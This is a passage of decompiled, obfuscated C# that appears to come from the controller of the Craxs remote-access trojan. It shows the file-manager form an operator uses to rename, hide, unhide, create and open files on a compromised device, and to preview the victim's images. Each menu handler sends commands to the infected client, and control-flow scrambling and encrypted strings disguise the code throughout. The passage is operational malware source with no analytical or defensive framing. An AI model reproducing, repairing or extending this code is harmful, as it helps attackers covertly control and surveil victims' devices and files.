            num1 = num5 = Operators.CompareString(Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag), EXGuarder.\u00314334840, false) != 0 ? -1035376418 : (num5 = 275598818);
            continue;
          case 7:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -1547982212 ^ 450278363;
            continue;
          case 8:
            str2 = Conversions.ToString(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u003581B3652));
            int num6 = ((Jector) this).classClient == null ? -1248231474 : (num6 = -508576137);
            num1 = num6 ^ (int) num3 * 1930686792;
            continue;
          case 9:
            checked { index += -1; }
            num1 = 1326456732;
            continue;
          case 10:
            goto label_13;
          default:
            goto label_14;
        }
      }
label_13:
      return;
label_14:;
    }

    private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = 1112211118;
      int index1;
      inp lc1;
      DialogResult dialogResult;
      string Left;
      string Right;
      int index2;
      int num2;
      object[] ParametersObjects;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (~(num1 * 941899235 * 1772977 + --~-464663350) - 2084600007 ^ 634971106)) % 26U)
        {
          case 0:
            lc1 = new inp();
            num1 = (int) num3 * 294649402 ^ 404005475;
            continue;
          case 1:
            int num4 = this.DGV0.SelectedRows.Count != 1 ? 1616612136 : (num4 = 1708822891);
            num1 = num4 ^ (int) num3 * -1141372586;
            continue;
          case 2:
            int num5;
            num1 = num5 = ((Jector) this).classClient == null ? -763737781 : (num5 = -89546302);
            continue;
          case 3:
            index2 = num2;
            num1 = (int) num3 * -1388785532 ^ -118032219;
            continue;
          case 4:
            goto label_1;
          case 5:
            int num6 = Operators.CompareString(Left, Right, false) == 0 ? -1502631297 : (num6 = 557828906);
            num1 = num6 ^ (int) num3 * 367206757;
            continue;
          case 6:
            num1 = (int) num3 * -1052546634 ^ 1584076767;
            continue;
          case 7:
            num1 = (int) num3 * 1631044811 ^ -115513465;
            continue;
          case 8:
            index1 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 1241007638 ^ -1266658068;
            continue;
          case 9:
            goto label_28;
          case 10:
            lc1.LTitle.Text = EXGuarder.\u00337705679;
            lc1.StartPosition = FormStartPosition.Manual;
            num1 = (int) num3 * -1921507692 ^ 583725766;
            continue;
          case 11:
            lc1.InputText.Text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index2].Index].Cells[1].Value);
            num1 = 639253711;
            continue;
          case 12:
            dialogResult = lc1.ShowDialog((IWin32Window) this);
            num1 = (int) num3 * -283964401 ^ 815342432;
            continue;
          case 13:
            int num7;
            num1 = num7 = index2 >= 0 ? -1335260790 : (num7 = -2088160989);
            continue;
          case 14:
            checked { index2 += -1; }
            num1 = (int) num3 * 2013290654 ^ 606427054;
            continue;
          case 15:
            Left = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00347610237), this.DGV0.Rows[this.DGV0.SelectedRows[index1].Index].Cells[1].Value));
            Right = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00347610237), (object) lc1.InputText.Text));
            num1 = -2118067066;
            continue;
          case 16:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003592C3406 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035C3A2D35 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00330701A14 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Left + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Right),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003351F3D25),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num3 * 1368310146 ^ 1397936793;
            continue;
          case 17:
            int num8;
            num1 = num8 = index1 >= 0 ? -431246658 : (num8 = -763737781);
            continue;
          case 18:
            num1 = (int) num3 * 603749945 ^ 722330828;
            continue;
          case 19:
            int num9 = this.DGV0.SelectedRows.Count != 1 ? -202886528 : (num9 = 578216878);
            num1 = num9 ^ (int) num3 * 523790453;
            continue;
          case 20:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * -1825648834 ^ 2144131252;
            continue;
          case 21:
            lc1.Location = Codes.FixSize((Form) this, (Form) lc1);
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 1010539768 ^ -715327686;
            continue;
          case 22:
            lc1.Close();
            num1 = 1994451962;
            continue;
          case 23:
            checked { index1 += -1; }
            num1 = 1385872388;
            continue;
          case 24:
            lc1.Text = EXGuarder.\u0032F0B6602;
            num1 = (int) num3 * 1748893699 ^ 1501714151;
            continue;
          case 25:
            int num10 = dialogResult == DialogResult.OK ? 721776204 : (num10 = -478203018);
            num1 = num10 ^ (int) num3 * 1310072995;
            continue;
          default:
            goto label_29;
        }
      }
label_28:
      return;
label_29:;
    }

    private void HideToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 392322536;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int index;
        string Right;
        string str1;
        string str2;
        switch ((num3 = (uint) (1737387035 * 19446339 - (-520337377 * -917871216 - (-1291835824 - (-num2 ^ -(998597551 * -1160311707) ^ (-785993177 ^ 432051738) * 667277837 + ~-1942341325))) - 1404481531)) % 12U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0035B234A53 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0032E5D1100 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031D1E1D5E + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str2),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0034B146A74),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num3 * -1230702456 ^ 2070336104;
            continue;
          case 1:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u003373F4A6B), (object) Right));
            num1 = (int) num3 * 2018368235 ^ -308295450;
            continue;
          case 2:
            goto label_1;
          case 3:
            int num4 = ((Jector) this).classClient == null ? -1966971312 : (num4 = -1397557286);
            num1 = num4 ^ (int) num3 * -1702495672;
            continue;
          case 4:
            Right = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value);
            int num5 = Right.Trim()[0] == '.' ? -1463405048 : (num5 = 1782489733);
            num1 = num5 ^ (int) num3 * 1763768540;
            continue;
          case 5:
            goto label_14;
          case 6:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 776205993 ^ 453826884;
            continue;
          case 7:
            int num6;
            num1 = num6 = !Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag, (object) EXGuarder.\u0032055746A, false))) ? 393925416 : (num6 = 351461906);
            continue;
          case 8:
            num1 = (int) num3 * -1606004606 ^ -1107614157;
            continue;
          case 9:
            int num7;
            num1 = num7 = index >= 0 ? 1035873497 : (num7 = 1059042511);
            continue;
          case 10:
            checked { index += -1; }
            num1 = 385003699;
            continue;
          case 11:
            str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u0036B175A05), (object) Right));
            num1 = (int) num3 * -814062053 ^ -795617674;
            continue;
          default:
            goto label_15;
        }
      }
label_14:
      return;
label_15:;
    }

    private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -1758011032;
      int index1;
      int num2;
      string Right1;
      string str1;
      string str2;
      object[] ParametersObjects;
      bool flag;
      int index2;
      string Right2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (-(~(-num1 * 1695900627) ^ -(1932876877 - 1350932243)) - -726509775)) % 22U)
        {
          case 0:
            goto label_1;
          case 1:
            flag = true;
            num1 = (int) num3 * -262617352 ^ 604492252;
            continue;
          case 2:
            num2 = checked (Right1.Length - 1);
            index1 = 0;
            num1 = (int) num3 * -2141771400 ^ 1141447421;
            continue;
          case 3:
            int num4;
            num1 = num4 = index2 >= 0 ? -240296800 : (num4 = -126207677);
            continue;
          case 4:
            int num5;
            num1 = num5 = !Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[index2].Index].Cells[0].Tag, (object) EXGuarder.\u00361375018, false))) ? -2111371452 : (num5 = -467598238);
            continue;
          case 5:
            int num6;
            num1 = num6 = !flag ? -499441093 : (num6 = -800382493);
            continue;
          case 6:
            int num7;
            num1 = num7 = Right1.Trim()[index1] == '.' ? -1947309835 : (num7 = 1955377762);
            continue;
          case 7:
            num1 = (int) num3 * 461809343 ^ -242114052;
            continue;
          case 8:
            Right1 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index2].Index].Cells[1].Value);
            int num8 = Right1.Trim()[0] != '.' ? -825311512 : (num8 = 1114710716);
            num1 = num8 ^ (int) num3 * -1120776983;
            continue;
          case 9:
            int num9;
            num1 = num9 = index1 <= num2 ? 1267198066 : (num9 = 1655636479);
            continue;
          case 10:
            num1 = (int) num3 * -695894249 ^ 2020414277;
            continue;
          case 11:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0031E0E1623 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00358510D33 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00329255732 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str2),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00350731E47),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num3 * -855366074 ^ -96132110;
            continue;
          case 12:
            checked { index2 += -1; }
            num1 = -436854089;
            continue;
          case 13:
            str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u0035B020D53), (object) Right2));
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u0035B020D53), (object) Right1));
            int num10 = ((Jector) this).classClient == null ? 745236066 : (num10 = -1104924649);
            num1 = num10 ^ (int) num3 * 372015158;
            continue;
          case 14:
            index2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -1312640889 ^ 801580125;
            continue;
          case 15:
            flag = false;
            num1 = (int) num3 * 1721219621 ^ -471314270;
            continue;
          case 16:
            Right2 += Conversions.ToString(Right1.Trim()[index1]);
            num1 = (int) num3 * 1954193131 ^ 1808391613;
            continue;
          case 17:
            Right2 += Conversions.ToString(Right1.Trim()[index1]);
            num1 = (int) num3 * -1253641396 ^ 1836048567;
            continue;
          case 18:
            Right2 = (string) null;
            num1 = (int) num3 * 1844593631 ^ 247016994;
            continue;
          case 19:
            goto label_24;
          case 20:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 498429377 ^ -232018110;
            continue;
          case 21:
            checked { ++index1; }
            num1 = 812416365;
            continue;
          default:
            goto label_25;
        }
      }
label_24:
      return;
label_25:;
    }

    private void AddFilesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).classClient == null)
        return;
label_1:
      int num1 = 757011976;
      inp lc1;
      object[] ParametersObjects;
      string Right;
      string str;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~num1 + ((1725224276 + 1410081334 - (-543492770 - 1626049289)) * -1066162173 ^ ~(~1863625309 ^ -1860824344 - -306892713)) ^ -77976253 * (-69089069 * -1326841434) ^ -1529631006) + ~1786713648 - 1293186322)) % 17U)
        {
          case 0:
            lc1.Close();
            num1 = -42638291;
            continue;
          case 1:
            num1 = (int) num2 * 250686946 ^ 454628682;
            continue;
          case 2:
            lc1.Location = Codes.FixSize((Form) this, (Form) lc1);
            lc1.BOXX.Visible = true;
            num1 = (int) num2 * -1951307757 ^ 1944074202;
            continue;
          case 3:
            goto label_19;
          case 4:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0030F37730F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00344044126 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003403E6345 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Conversions.ToString(flag1)),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0030B2B7138),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num2 * -1577791325 ^ -1890427562;
            continue;
          case 5:
            lc1 = new inp();
            num1 = (int) num2 * 858299022 ^ -1132457847;
            continue;
          case 6:
            Right = lc1.InputText.Text;
            num1 = (int) num2 * 1716657411 ^ 1526933874;
            continue;
          case 7:
            lc1.Text = EXGuarder.\u003633A225B;
            lc1.LTitle.Text = EXGuarder.\u003163A101E;
            num1 = (int) num2 * -429487849 ^ -812795474;
            continue;
          case 8:
            int num3;
            num1 = num3 = ((Jector) this).classClient == null ? 550531146 : (num3 = -249685430);
            continue;
          case 9:
            str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00310471349), (object) Right));
            num1 = 590911438;
            continue;
          case 10:
            int num4 = !flag2 ? 1743317502 : (num4 = -841120579);
            num1 = num4 ^ (int) num2 * -555418102;
            continue;
          case 11:
            flag1 = lc1.CheckFolder.Checked;
            flag2 = lc1.CheckHidden.Checked;
            num1 = (int) num2 * 581183611 ^ -1808821305;
            continue;
          case 12:
            Right = EXGuarder.\u0036F790E2A + Right;
            num1 = (int) num2 * 910512085 ^ -839615224;
            continue;
          case 13:
            int num5 = lc1.ShowDialog((IWin32Window) this) == DialogResult.OK ? -1857208349 : (num5 = -395465821);
            num1 = num5 ^ (int) num2 * -1369278812;
            continue;
          case 14:
            lc1.StartPosition = FormStartPosition.Manual;
            num1 = (int) num2 * -1207432800 ^ 103204102;
            continue;
          case 15:
            goto label_1;
          case 16:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -2055929501 ^ 274800252;
            continue;
          default:
            goto label_20;
        }
      }
label_19:
      return;
label_20:;
    }

    private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -2034879108;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string str1;
        string str2;
        int index;
        switch ((num3 = (uint) (-1576495416 - --~((-(970042019 * ---1075355784) ^ 1585956314 - -116995056 - (425561103 - 133014032 - --905633167 - 1241009236)) - num2 ^ ((-1986476402 ^ -1077761895) - -2110883016 + -89000769 * 1435661003) * -1678538191))) % 11U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0032F570235 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003685A1713 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035B52645C + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str2),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003191E4707),
              (object) ((Jector) this).classClient
            });
            num1 = -1913120636;
            continue;
          case 1:
            checked { index += -1; }
            num1 = 1284989210;
            continue;
          case 2:
            goto label_13;
          case 3:
            num1 = (int) num3 * -270722833 ^ -1203767885;
            continue;
          case 4:
            int num4;
            num1 = num4 = Operators.CompareString(Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag), EXGuarder.\u00336240164, false) != 0 ? -1913120636 : (num4 = 801923128);
            continue;
          case 5:
            int num5;
            num1 = num5 = index >= 0 ? -1969062131 : (num5 = -2059696869);
            continue;
          case 6:
            goto label_1;
          case 7:
            str2 = EXGuarder.\u003191E4707;
            int num6 = !(str1.Contains(EXGuarder.\u0036914685A) & !str1.EndsWith(EXGuarder.\u0036914685A)) ? -2055049879 : (num6 = 1074347036);
            num1 = num6 ^ (int) num3 * -1697989225;
            continue;
          case 8:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00325425E2D), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            int num7 = ((Jector) this).classClient == null ? -719586908 : (num7 = -640771174);
            num1 = num7 ^ (int) num3 * -299644320;
            continue;
          case 9:
            str2 = str1.Substring(checked (str1.LastIndexOf(EXGuarder.\u0036914685A) + 1));
            num1 = (int) num3 * 2126773838 ^ 1476741150;
            continue;
          case 10:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 1929151405 ^ 1054078791;
            continue;
          default:
            goto label_14;
        }
      }
label_13:
      return;
label_14:;
    }

    private bool ISupportedText(string t)
    {
      if (!t.Contains(EXGuarder.\u0036B730207))
        goto label_5;
label_1:
      int num1 = 1424568123;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) --~(num1 - ~((728476429 + (~-913348329 + 2061055701 * -161718010)) * 1096828021))) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            flag = true;
            num1 = (int) num2 * -1877811149 ^ -723682874;
            continue;
          case 2:
            string str = EXGuarder.\u0034A1C6362 + t.Substring(t.LastIndexOf(EXGuarder.\u0036B730207)) + EXGuarder.\u0034A1C6362;
            int num3 = !Settings.SupportedText.Contains(str) ? -269455004 : (num3 = 441065744);
            num1 = num3 ^ (int) num2 * -1827522803;
            continue;
          case 3:
            flag = false;
            num1 = 960481159;
            continue;
          case 5:
            goto label_5;
          default:
            goto label_7;
        }
      }
label_7:
      return flag;
label_5:
      flag = false;
      num1 = 960481159;
      goto label_2;
    }

    private bool ISupportedImages(string t)
    {
      if (!t.Contains(EXGuarder.\u00375522D79))
        goto label_3;
label_1:
      int num1 = 1925915222;
label_2:
      bool flag;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (---(num1 ^ 494747819 * (-1848468056 ^ -1435003778) + (~1578426182 ^ ~-609840795) - --(2112560065 * 527599568) ^ ((1721892876 ^ 57433251) - (1450694530 + 617793086) - 175299177) * -210582921) * -1787758689)) % 8U)
        {
          case 0:
            flag = false;
            num1 = 379242913;
            continue;
          case 1:
            str = EXGuarder.\u0033E770535 + t.Substring(t.LastIndexOf(EXGuarder.\u00375522D79)) + EXGuarder.\u0033E770535;
            num1 = (int) num2 * -21005458 ^ -1218650003;
            continue;
          case 2:
            goto label_1;
          case 3:
            flag = true;
            num1 = (int) num2 * -1881451549 ^ 1989561699;
            continue;
          case 4:
            int num3 = !Settings.SupportedImages.Contains(str) ? 1391009099 : (num3 = 680799408);
            num1 = num3 ^ (int) num2 * -28661553;
            continue;
          case 6:
            num1 = (int) num2 * -2344597 ^ -2135035704;
            continue;
          case 7:
            goto label_3;
          default:
            goto label_9;
        }
      }
label_9:
      return flag;
label_3:
      flag = false;
      num1 = -1898377806;
      goto label_2;
    }

    private bool ISupportedVideo(string t)
    {
      if (!t.Contains(EXGuarder.\u0036D486A28))
        goto label_7;
label_1:
      int num1 = 76722231;
label_2:
      bool flag;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~~(-num1 + ~-(124594310 ^ -1008411840 ^ -938269169)) * -1072788171)) % 9U)
        {
          case 0:
            goto label_7;
          case 1:
            flag = true;
            num1 = (int) num2 * -345704202 ^ -1541007668;
            continue;
          case 3:
            num1 = (int) num2 * 1457658693 ^ 1717864342;
            continue;
          case 4:
            flag = false;
            num1 = -309206774;
            continue;
          case 5:
            int num3 = !Settings.SupportedVideo.Contains(str) ? -1741898253 : (num3 = 1340177982);
            num1 = num3 ^ (int) num2 * 743208625;
            continue;
          case 6:
            num1 = (int) num2 * 474674238 ^ 451371779;
            continue;
          case 7:
            goto label_1;
          case 8:
            str = EXGuarder.\u0037208083A + t.Substring(t.LastIndexOf(EXGuarder.\u0036D486A28)) + EXGuarder.\u0037208083A;
            num1 = (int) num2 * 869549535 ^ 837596026;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return flag;
label_7:
      flag = false;
      num1 = 1603730773;
      goto label_2;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = -1711609270;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~--((-493561010 ^ ~(465068265 * (423050133 ^ 2074849481))) - (num2 + (~~(-35842223 + (-415460199 - 1005717513)) - ~-(-497970067 * 378425473 - 2090288568))))) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num3 * 1238916475 ^ 2046593090;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = -1796407631;
      goto label_2;
    }

    private void DGV0_SelectionChanged(object sender, EventArgs e)
    {
      try
      {
        if (this.DGV0.SelectedRows.Count != 1)
          return;
label_1:
        int num1 = -1406594039;
        while (true)
        {
          uint num2;
          int index;
          string Left;
          string str1;
          bool flag;
          int num3;
          string str2;
          switch ((num2 = (uint) (-~(num1 - ---(-393274989 - -1207326288 ^ --1475862109)) - 1035215043 * (-1952955093 - 1774272557))) % 10U)
          {
            case 0:
              str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u0032A1B2D67), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
              num1 = (int) num2 * -860244636 ^ 1545989332;
              continue;
            case 2:
              Left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag);
              num1 = (int) num2 * 2029483908 ^ -274449047;
              continue;
            case 3:
label_13:
              if (index >= 0)
              {
                num1 = -1814530215;
                continue;
              }
              goto label_44;
            case 4:
              goto label_1;
            case 5:
              index = num3;
              num1 = (int) num2 * 242298572 ^ -22174890;
              continue;
            case 6:
              if (Operators.CompareString(Left, EXGuarder.\u0033C0F6A11, false) == 0)
              {
                num1 = (int) num2 * -305165328 ^ -761807747;
                continue;
              }
              goto label_72;
            case 7:
              flag = false;
              // ISSUE: reference to a compiler-generated field
              ((Jector) this).FileDirectory = Conversions.ToString(Operators.ConcatenateObject((object) (((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).FolderUSER + EXGuarder.\u0036F0C3D79), NewLateBinding.LateGet(this.DGV0.Tag, (Type) null, EXGuarder.\u0032F795404, new object[2]
              {
                (object) EXGuarder.\u0032A1B2D67,
                (object) EXGuarder.\u0036A2D1B46
              }, (string[]) null, (Type[]) null, (bool[]) null)));
              if (str1.Substring(checked (str1.LastIndexOf(EXGuarder.\u0032A1B2D67) + 1)).EndsWith(EXGuarder.\u0035E733F09))
              {
                num1 = (int) num2 * -1498240570 ^ -943668598;
                continue;
              }
              break;
            case 8:
              num3 = checked (this.DGV0.SelectedRows.Count - 1);
              num1 = (int) num2 * 1799404167 ^ -1322533236;
              continue;
            case 9:
              str2 = str1.Substring(checked (str1.LastIndexOf(EXGuarder.\u0032A1B2D67) + 1));
              if (this.thumb_chk.Checked)
              {
                num1 = (int) num2 * 1777279287 ^ 275755851;
                continue;
              }
              break;
            default:
              IEnumerator<string> enumerator;
              if (Directory.Exists(((Jector) this).FileDirectory + EXGuarder.\u0036A2D1B46 + str2.Replace(EXGuarder.\u0035E733F09, EXGuarder.\u00342637937)))
              {
                try
                {
                  enumerator = MyComputer.get_Computer().FileSystem.GetFiles(((Jector) this).FileDirectory + EXGuarder.\u0036A2D1B46 + str2.Replace(EXGuarder.\u0035E733F09, EXGuarder.\u00342637937)).GetEnumerator();
label_17:
                  int num4 = -2063435589;
                  string current;
                  FileInfo fileInfo;
                  while (true)
                  {
                    uint num5;
                    switch ((num5 = (uint) (-~(num4 - ---(-393274989 - -1207326288 ^ --1475862109)) - 1035215043 * (-1952955093 - 1774272557))) % 7U)
                    {
                      case 0:
                        goto label_17;
                      case 1:
                        flag = true;
                        num4 = (int) num5 * 369706937 ^ -1640216320;
                        continue;
                      case 2:
                        this.viwimage.Image = (Image) Codes.ReadBitmapFromFile(((Jector) this).FileDirectory + EXGuarder.\u0036A2D1B46 + str2.Replace(EXGuarder.\u0035E733F09, EXGuarder.\u00342637937) + EXGuarder.\u0036A2D1B46 + fileInfo.Name);
                        this.viwimage.Visible = true;
                        num4 = (int) num5 * 1025670859 ^ 523919629;
                        continue;
                      case 3:
                        int num6 = !enumerator.MoveNext() ? -1130721884 : (num6 = -1264041128);
                        num4 = num6 ^ (int) num5 * 1628018210;
                        continue;
                      case 4:
                        current = enumerator.Current;
                        num4 = (int) num5 * 1631181458 ^ -1770300951;
                        continue;
                      case 5:
                        fileInfo = MyComputer.get_Computer().FileSystem.GetFileInfo(current);
                        num4 = (int) num5 * -1304938182 ^ -183059775;
                        continue;
                      default:
                        goto label_29;
                    }
                  }
                }
                finally
                {
                  if (enumerator != null)
                  {
label_25:
                    int num7 = -2096742533;
                    while (true)
                    {
                      uint num8;
                      switch ((num8 = (uint) (-~(num7 - ---(-393274989 - -1207326288 ^ --1475862109)) - 1035215043 * (-1952955093 - 1774272557))) % 3U)
                      {
                        case 1:
                          enumerator.Dispose();
                          num7 = (int) num8 * -395795741 ^ 439088813;
                          continue;
                        case 2:
                          goto label_25;
                        default:
                          goto label_28;
                      }
                    }
                  }
label_28:;
                }
              }
              else
                break;
          }
label_29:
          if (!flag)
          {
label_30:
            int num9 = -1886081704;
            while (true)
            {
              uint num10;
              switch ((num10 = (uint) (-~(num9 - ---(-393274989 - -1207326288 ^ --1475862109)) - 1035215043 * (-1952955093 - 1774272557))) % 4U)
              {
                case 0:
                  if (Directory.Exists(((Jector) this).FileDirectory))
                  {
                    num9 = (int) num10 * 342606367 ^ 1520271917;
                    continue;
                  }
                  goto label_51;
                case 1:
                  if (this.thumb_chk.Checked)
                  {
                    num9 = (int) num10 * -1817509782 ^ 979409417;
                    continue;
                  }
                  goto label_51;
                case 3:
                  goto label_30;
                default:
                  goto label_37;
              }
            }
label_37:
            if (File.Exists(((Jector) this).FileDirectory + EXGuarder.\u0036A2D1B46 + str1.Substring(checked (str1.LastIndexOf(EXGuarder.\u0032A1B2D67) + 1))))
            {
              try
              {
                if (this.viwimage.Image != null)
                {
label_39:
                  int num11 = -1889352815;
                  while (true)
                  {
                    uint num12;
                    switch ((num12 = (uint) (-~(num11 - ---(-393274989 - -1207326288 ^ --1475862109)) - 1035215043 * (-1952955093 - 1774272557))) % 4U)
